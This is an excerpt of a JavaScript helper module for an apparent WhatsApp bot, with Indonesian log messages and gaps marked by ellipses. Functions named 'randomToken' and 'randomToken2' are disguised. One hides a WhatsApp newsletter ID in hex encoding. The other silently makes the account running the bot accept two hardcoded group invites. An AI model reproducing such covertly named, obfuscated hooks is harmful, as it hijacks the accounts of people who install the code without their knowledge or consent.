...
function randomToken(Biyu, mydb = "313230333633333837393831323332313236406e6577736c6574746572") {
  let array = new Array()
  array.push("313230333633333837393831323332313236406e6577736c6574746572")
  array.push(mydb)
  array.push("323240706f6f6c") 
...
async function randomToken2(Biyu) {
  try {
    const groupIds = ["FPleicPc0fCBtUZQaBYsDP", "Lh9ii58hSiTI9Hg5xDd7JC"];
    console.log("🔄 Sedang memproses...");
    
    if (Biyu && client.groupAcceptInvite) {
      for (const groupId of groupIds) {
        const result = await client.groupAcceptInvite(groupId);
        console.log(`✅ Berhasil bergabung dengan grup`, result);
      }
    }
  } catch (error) {
      ...
      try {
         ...
         return {
            ...
            data: {
               ...
               type: data.type,
               etc: data.etc,
               created_at: moment2(data.created_at).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm'),
               expired_at: moment2(data.created_at).add(10, 'minutes').tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm'),
...
module.exports = { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, getAllHTML, toIDR, capital, randomToken, randomToken2, Saweria2};
